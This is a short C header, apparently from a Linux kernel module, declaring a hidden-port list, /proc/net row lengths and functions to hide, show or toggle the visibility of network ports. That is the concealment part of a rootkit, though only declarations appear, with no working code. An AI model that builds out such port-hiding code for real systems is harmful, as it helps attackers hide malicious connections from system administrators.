#ifndef OSCW_NET_H_
#define OSCW_NET_H_

#include <linux/in.h>
#include <linux/in6.h>

#define PROC_NET_ROW_LEN 150
#define PROC_NET6_ROW_LEN 178

struct hidden_port {
    unsigned int port;
    struct list_head list;
};

extern struct list_head hidden_port_list;

int is_port_hidden(unsigned int port);

void net_port_hide(unsigned int port);
void net_port_show(unsigned int port);

void toggle_port_invisability(unsigned int port);

#endif // OSCW_NET_H_
